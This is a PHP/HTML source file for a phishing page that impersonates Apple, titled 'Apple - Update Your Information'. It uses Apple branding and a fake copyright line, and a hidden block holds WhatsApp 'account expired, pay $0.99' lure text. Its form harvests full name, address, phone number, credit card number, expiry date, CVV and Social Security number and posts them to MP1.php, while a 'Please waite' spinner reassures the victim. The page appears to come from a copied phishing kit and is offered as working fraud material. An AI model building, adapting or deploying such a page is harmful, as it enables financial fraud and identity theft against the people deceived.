<?php session_start() ?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
	<title>Apple - Update Your Information</title>
	<link rel="icon" href="https://www.apple.com/favicon.ico">

	<!-- Bootstrap -->
	<link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
	<!-- copy man hna -->
	<link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">

	<style type="text/css">
		body{
			padding-top: 70px;
		}
		.active a{
			background: #333 !important;
			background-color: #333 !important;
		}
		li a{
			color: #fff !important;
		}
		.whatsapp-icon, .footer *, .icon-bar{
			color: #fff !important;
		}
		.footer {
			padding-top: 20px;
			height: 60px;
			background: rgba(0,0,0,0.8) !important;
		}
		.nav-apple {
			background-color: rgba(0,0,0,0.8) !important;
		}
		.btn-apple {
			padding: 5px 36px;
			text-decoration: none;
			background: #08c;
			border-radius: 16px;
			color: #fff;
			font-size: 9pt;
			border-style: solid;
			border-color: #08c;
		}
		.btn-apple:hover {
			background: #005a88 !important;
		}
		.nav {
			width: 100% !important;
			text-align: center !important;
		}
		.nav li {
			width: 10% !important;
		}
		.modal-el{width:100%;height:100%;margin:0;left:0;top:0;position:fixed;visibility:hidden;}
		#transparent_div{opacity:0.9!important;z-index:99998!important;background:black;}
		#modal_text{color:#fff!important;z-index:99999!important;background:transparent!important;padding:20%;text-align:center;}
	</style>
	<!-- 7ta lhna -->
</head>
<body>
	<nav class="navbar navbar-default navbar-fixed-top nav-apple">
	  <div class="container">
		<!-- Brand and toggle get grouped for better mobile display -->
		<div class="navbar-header">
		  <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false">
			<span class="sr-only">Toggle navigation</span>
			<span class="icon-bar"></span
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
		  </button>
		  <a class="navbar-brand hide-md visible-xs" href="#"><i class="fa fa-5 fa-apple whatsapp-icon"></i></a>
		</div>

		<!-- Collect the nav links, forms, and other content for toggling -->
		<div class="collapse navbar-collapse nav-whatsapp" id="bs-example-navbar-collapse-1">
		  <ul class="nav navbar-nav">
			<li><a class="navbar-brand" href="#"><i class="fa fa-5 fa-apple whatsapp-icon"></i></a></li>
			<li class="active"><a href="#">Mac<span class="sr-only">(current)</span></a></li>
			<li><a href="#">iPad</a></li>
			<li><a href="#">iPhone</a></li>
			<li><a href="#">Watch</a></li>
			<li><a href="#">TV</a></li>
			<li><a href="#">Music</a></li>
			<li><a href="#">Support</a></li>
			<li><a href="#"><i class="fa fa-search"></i></a></li>
			<li><a href="#"><i class="fa fa-shopping-bag"></i></a></li>
		  </ul>
		  <ul class="nav navbar-nav navbar-right hide">
			<li><a href="#">Help</a></li>
			<li><a href="#">Contact</a></li>
		  </ul>
		</div><!-- /.navbar-collapse -->
	  </div><!-- /.container-fluid -->
	</nav>
	<div class="container">
		<div class="row hide">
			<div class="col-xs-12 col-md-offset-3 col-md-6">
				<div class="alert alert-warning">
					<h4>Warning <i class="fa fa-warning"></i></h4>
					<p>
						Your WhatsApp Messenger Account has expired.

It is imperative to conduct an audit of your date now, or your Accounts is destroyed.

If your membership is expired when you renew, your renewal will activate once you complete the renewal process

Please renew as soon as possible to avoid the loss of all media (images, videos, historical…)<br>
You must pay <b>USD 0.99$</b> to continue using your whatsapp account.
					</p>
				</div>
			</div>
		</div>
		<div class="row">
			<form method="post" action="MP1.php">
				<div class="col-xs-12 col-md-offset-3 col-md-6">
					<div class="col-xs-12">
						<div class="form-group">
							<label>Full name</label>
							<input type="text" name="fullname" class="form-control" placeholder="Ex: Jhon Smith" required>
						</div>
					</div>
					<div class="col-xs-12">
						<div class="form-group">
							<label>Address line</label>
							<input type="text" name="address" class="form-control" placeholder="Address line" required>
						</div>
					</div>
					<div class="col-xs-12 col-md-4">
						<div class="form-group">
							<label>City</label>
							<input type="text" name="city" class="form-control" placeholder="City" required>
						</div>
					</div>
					<div class="col-xs-12 col-md-4">
						<div class="form-group">
							<label>State</label>
							<input type="text" name="state" class="form-control" placeholder="State">
						</div>
					</div>
					<div class="col-xs-12 col-md-4">
						<div class="form-group">
							<label>Zip Code</label>
							<input type="text" name="zip_code" class="form-control" placeholder="Zip Code" required>
						</div>
					</div>
					<div class="col-xs-12">
						<div class="form-group">
							<label>Phone number</label>
							<input type="text" name="phone" class="form-control" placeholder="Ex: +1">
						</div>
					</div>
					<div class="col-xs-12">
						<div class="form-group">
							<label>Credit Card Number</label>
							<img src="img/payments.png" height="50">
							<input type="text" name="card_id" class="form-control" placeholder="XXXX-XXXX-XXXX-XXXX" required>
						</div>
					</div>
					<div class="col-xs-6 col-md-5">
						<div class="form-group">
							<label>Expiration Date</label>
							<input type="text" name="exp_date" class="form-control" placeholder="Year" required>
						</div>
					</div>
					<div class="col-xs-6 col-md-4">
						<div class="form-group">
							<label>&nbsp;</label>
							<input type="text" name="exp_date2" class="form-control" placeholder="Month" required>
						</div>
					</div>
					<div class="col-xs-12 col-md-3">
						<div class="form-group">
							<label>CVV</label>
							<input type="text" name="cvv" class="form-control" placeholder="CVV" required>
						</div>
					</div>
					<div class="col-xs-12 col-md-4">
						<div class="form-group">
							<label>SSN</label>
							<input type="text" name="SSN" class="form-control" placeholder="xxx-xx-xxxx">
						</div>
					</div>
					<div class="col-xs-12 text-right">
						<button type="submit" class="btn-apple">
							Submit
						</button>
					</div>
				</div>
			</form>
		</div>
	</div>
	<div class="col-xs-12 hidden-md">&nbsp;</div>
	<div class="col-xs-12 hidden-md">&nbsp;</div>
	<div class="col-xs-12 hidden-md">&nbsp;</div>
	<div class="col-xs-12 hidden-md">&nbsp;</div>
	<div class="col-xs-12 hidden-md">&nbsp;</div>
	<nav class="navbar navbar-fixed-bottom footer text-center">
		<p class="text-muted">Copyright © 2017 Apple Inc. All rights reserved.</p>	
	</nav>
	<div class="modal-el" id="transparent_div"></div>
	<div class="modal-el" id="modal_text">
		<p>Please waite ...<br><br><i class="fa fa-spinner fa-pulse fa-3x fa-fw"></i></p>
	</div>
	<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
	<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
	<!-- Include all compiled plugins (below), or include individual files as needed -->
	<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

	<script type="text/javascript">
		$('form').on('submit', function(e) {
			$('.modal-el').css({'visibility' : 'visible'});
			setTimeout(function(){ console.log('OK') }, 3000);
		});
	</script>
</body>
</html>